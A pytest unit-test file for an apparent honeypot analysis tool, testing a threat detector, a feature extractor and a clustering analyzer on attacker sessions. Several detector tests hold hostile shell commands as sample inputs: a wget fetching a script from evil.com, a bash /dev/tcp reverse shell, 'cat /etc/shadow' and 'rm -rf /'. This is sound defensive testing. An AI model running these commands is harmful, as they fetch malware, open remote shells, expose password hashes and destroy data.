"""
LLMPot — ML Pipeline Unit Tests
"""

import sys
import os
import numpy as np
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from analysis.threat_detector import ThreatDetector
from analysis.feature_extractor import FeatureExtractor
from analysis.ml_analyzer import MLAnalyzer


class TestThreatDetector:
    """Test rule-based threat detection."""

    def setup_method(self):
        self.detector = ThreatDetector()

    def test_safe_command(self):
        result = self.detector.analyze_command("ls -la")
        assert result["severity"] == "low"

    def test_critical_rm_rf(self):
        result = self.detector.analyze_command("rm -rf /")
        assert result["is_dangerous"]
        assert result["severity"] == "critical"
        assert result["score"] >= 90

    def test_high_wget(self):
        result = self.detector.analyze_command("wget http://evil.com/malware.sh")
        assert result["is_dangerous"]
        assert result["category"] == "malware_download"

    def test_medium_cat_shadow(self):
        result = self.detector.analyze_command("cat /etc/shadow")
        assert result["is_dangerous"]
        assert result["category"] == "reconnaissance"

    def test_low_whoami(self):
        result = self.detector.analyze_command("whoami")
        assert result["severity"] == "low"
        assert not result["is_dangerous"]

    def test_empty_command(self):
        result = self.detector.analyze_command("")
        assert not result["is_dangerous"]

    def test_session_analysis(self):
        commands = ["whoami", "id", "wget http://bad.com/x", "rm -rf /tmp"]
        result = self.detector.analyze_session_commands(commands)
        assert result["dangerous_commands"] >= 1
        assert result["threat_level"] in ("critical", "high", "medium")

    def test_chmod_detection(self):
        result = self.detector.analyze_command("chmod +x script.sh")
        assert result["is_dangerous"]
        assert result["category"] == "persistence"

    def test_reverse_shell(self):
        result = self.detector.analyze_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert result["is_dangerous"]
        assert result["score"] >= 85


class TestFeatureExtractor:
    """Test feature extraction."""

    def setup_method(self):
        self.extractor = FeatureExtractor()

    def test_extract_basic(self):
        session = {
            "duration_seconds": 120,
            "command_count": 5,
            "username": "root",
            "password": "root",
            "all_commands": "whoami|||id|||uname -a|||ls|||exit",
        }
        features = self.extractor.extract_features(session)
        assert features is not None
        assert len(features) == len(FeatureExtractor.FEATURE_NAMES)
        assert features[0] == 120  # duration
        assert features[1] == 5    # command_count

    def test_extract_empty(self):
        session = {
            "duration_seconds": 0,
            "command_count": 0,
            "all_commands": "",
        }
        features = self.extractor.extract_features(session)
        assert features is not None

    def test_extract_batch(self):
        sessions = [
            {"session_id": "s1", "duration_seconds": 60, "command_count": 3,
             "password": "root", "all_commands": "whoami|||id|||exit"},
            {"session_id": "s2", "duration_seconds": 300, "command_count": 10,
             "password": "p@ssw0rd!", "all_commands": "wget http://x|||chmod +x y"},
        ]
        matrix, ids = self.extractor.extract_batch(sessions)
        assert len(matrix) == 2
        assert len(ids) == 2


class TestMLAnalyzer:
    """Test ML analyzer."""

    def test_train_and_predict(self):
        analyzer = MLAnalyzer()

        # Generate synthetic features
        np.random.seed(42)
        n = 50
        features = np.vstack([
            np.random.randn(n, 15) + [0, 2, 1, 0, 0, 5, 0, 1, 0, 0, 0, 1, 1, 1, 10],
            np.random.randn(n, 15) + [300, 15, 8, 5, 0.3, 20, 1, 1, 1, 0, 0, 2, 3, 2, 80],
            np.random.randn(n, 15) + [60, 5, 3, 1, 0.1, 10, 0, 1, 0, 0, 0, 1, 2, 5, 30],
            np.random.randn(n, 15) + [500, 20, 12, 8, 0.4, 25, 1, 1, 1, 1, 0, 3, 5, 1, 95],
        ])
        features = np.abs(features)  # Ensure positive

        result = analyzer.train(features, num_clusters=4)
        assert "error" not in result
        assert result["num_clusters"] == 4
        assert result["silhouette_score"] > -1

        # Test prediction
        sample = features[0:1]
        prediction = analyzer.predict(sample[0])
        assert prediction is not None
        assert "cluster_id" in prediction
        assert "cluster_label" in prediction
        assert 0 <= prediction["confidence"] <= 1

    def test_not_enough_data(self):
        analyzer = MLAnalyzer()
        features = np.random.randn(2, 15)
        result = analyzer.train(features, num_clusters=4)
        # Should handle gracefully (either succeed with k=2 or error)
        assert isinstance(result, dict)

    def test_pca_projection(self):
        analyzer = MLAnalyzer()
        features = np.abs(np.random.randn(30, 15))
        analyzer.train(features, num_clusters=3)

        pca = analyzer.get_pca_projection(features, n_components=2)
        assert pca is not None
        assert pca.shape == (30, 2)
